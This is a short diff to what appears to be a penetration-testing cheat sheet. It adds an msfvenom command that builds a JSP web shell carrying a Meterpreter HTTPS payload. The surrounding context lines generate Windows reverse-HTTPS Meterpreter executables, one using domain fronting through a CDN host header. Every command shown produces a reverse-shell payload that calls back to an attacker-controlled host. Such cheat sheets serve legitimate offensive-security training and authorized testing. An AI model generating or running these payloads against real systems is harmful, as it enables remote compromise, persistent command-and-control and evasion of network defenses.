@@ -474,6 +474,9 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.83 LPORT=443 
 
 # domain fronting
 msfvenom -p windows/x64/meterpreter_reverse_https HttpHostHeader=cdn123.vaultcdn.com LHOST=good.com LPORT=443 -f exe > https-df.exe
+
+# c2 web shell
+msfvenom -p generic/custom PAYLOADFILE=bin/meterp-https-x64.bin LHOST=10.10.14.4 LPORT=443 -f jsp -o test.jsp -a x64 --platform windows
 ```
 
 #### Linux Payload Generation
